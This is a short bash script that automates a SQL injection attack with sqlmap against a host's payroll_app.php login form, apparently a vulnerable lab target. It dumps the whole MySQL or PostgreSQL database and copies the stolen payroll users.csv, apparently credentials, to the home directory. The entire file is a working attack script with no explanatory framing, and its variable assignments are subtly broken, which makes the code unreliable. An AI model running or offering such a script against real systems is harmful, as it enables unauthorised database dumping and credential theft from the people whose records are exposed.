TARGET = $1
DATABASE = $2

if [ $DATABASE == "mysql" ]
then 
	sqlmap -u http://$TARGET/payroll_app.php --data="user=admin&password=admin&s=OK" --dbms=mysql --dump 
	mv ~/.sqlmap/output/$TARGET/dump/payroll/users.csv ~/
elif [ $DATABASE == "postgresql" ]
then
	sqlmap -u http://$TARGET/payroll_app.php --data="user=admin&password=admin&s=OK" --dbms=postgresql --dump
	mv ~/.sqlmap/output/$TARGET/dump/payroll/users.csv ~/  
else
	echo "Not valid."
fi

